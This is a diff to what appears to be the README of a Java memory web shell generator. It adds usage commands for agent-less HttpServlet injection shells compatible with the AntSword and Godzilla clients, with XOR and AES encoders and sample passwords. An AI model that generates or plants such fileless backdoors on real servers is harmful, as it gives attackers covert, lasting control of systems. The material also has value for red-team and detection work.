@@ -145,6 +145,10 @@ Type **JSP** with **[rc_4_sha256](extend/AntSword/encoder/rc_4_sha256.js)** Enco
 
 `python generator.py Java Tomcat Servlet RC4 AntSword passwd`
 
+Type **JSP**  with **[xor_md5](extend/AntSword/encoder/xor_md5.js)** Encoder | AgentFiless Inject HttpServlet
+
+`python generator.py Java JDK JavaX XOR AntSword passwd`
+
 Type **JSPJS** with **[aes_128_ecb_pkcs7_padding_md5](extend/AntSword/encoder/aes_128_ecb_pkcs7_padding_md5.js)** Encoder | Inject Tomcat WsFilter
 
 `python generator.py Java Tomcat WsFilter AES128 JSPJS passwd`
@@ -170,6 +174,10 @@ Type **default_xor_base64** | Inject Spring Interceptor
 Type **JAVA_AES_BASE64** | Inject Tomcat Valve
 
 `python generator.py Java Tomcat Valve AES128 Godzilla superidol`
+
+Type **JAVA_AES_BASE64** | AgentFiless Inject HttpServlet
+
+`python generator.py Java JDK JavaX AES128 Godzilla superidol`
 
 > [Known issue](https://github.com/BeichenDream/Godzilla/issues/76)
 
